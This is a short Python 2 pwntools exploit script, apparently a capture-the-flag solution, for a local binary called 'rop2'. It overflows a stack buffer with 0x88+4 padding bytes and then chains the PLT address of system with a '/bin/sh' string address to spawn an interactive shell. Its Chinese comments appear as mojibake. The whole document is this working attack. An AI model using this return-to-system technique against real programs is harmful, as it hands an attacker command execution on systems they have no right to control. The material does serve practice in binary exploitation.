# -*- coding: utf-8 -*-
#!/usr/bin/env python2
from pwn import *
context.log_level = 'debug'
context.arch = 'x86' #amd64,x86
LOCAL = True
if LOCAL:
    p = process('rop2')
else:
    p = remote('127.0.0.1',10001)

def main():
    system_addr = 0x080483A0 #PLT���е�_system��ַ���ӳٰ󶨣�
    bin_sh_addr = 0x08048610
    payload = 'b'*(0x88+4)+p32(system_addr)+'$ebp'+p32(bin_sh_addr) #ջ��չ��ַ���������ĸ��ǵ�ַ�෴��������Ӧ����system��ַ
    #p.recvuntil('Name:')
    #p.sendline(name)
    #p.recvuntil('best:')
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    
    main()